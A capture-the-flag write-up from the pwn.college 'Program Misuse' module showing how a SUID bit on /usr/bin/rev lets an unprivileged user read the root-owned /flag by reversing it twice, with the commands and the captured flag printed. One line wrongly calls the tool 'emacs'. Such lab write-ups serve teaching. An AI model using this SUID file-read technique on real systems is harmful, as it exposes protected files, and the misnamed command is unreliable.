---
layout: page
title: "Challenge Name: rev"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/rev`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/rev
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/rev
```

-The `s` in `-rws` indicates it's a SUID binary.
-`rev` runs with **root privileges**.

## 🚀 Exploitation

The `emacs` command in Linux reverses the characters in each line of a file or standard input. 

We can simply double reverse the /flag while storing ouptut in a variable to reveal the flag.

```bash
myflag=$(rev /flag)
echo "$myflag" | rev
```

Output:
```
pwn.college{0yrk_SqiqllhJjs5dX0aI_peczm.dJTNxwSM0IzMyEzW}
```

